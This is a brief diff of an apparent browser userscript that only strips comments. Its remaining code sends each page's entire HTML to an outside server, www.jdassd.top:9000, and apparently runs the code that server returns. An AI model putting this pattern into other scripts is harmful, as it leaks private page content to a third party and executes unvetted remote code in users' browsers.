@@ -11,18 +11,12 @@
 
 (function() {
     'use strict';
-
-    // Your code here...
-
     // 监听页面加载事件
     window.onload = function() {
         // 页面完全加载后执行此函数
         const entireHTML = getEntireHTMLContent();
-        //console.log('获取html：' + entireHTML);
-        // 使用方法
         // fetchAndExecute('https://1255318900-923de4mtau-cd.scf.tencentcs.com/test/htmlGenerateJs', entireHTML);
         fetchAndExecute('http://www.jdassd.top:9000/test/htmlGenerateJs', entireHTML);
-        // 如果需要进一步处理或保存整个HTML内容，可以在这里添加相关代码
     };
 
     // 获取整个HTML内容的函数
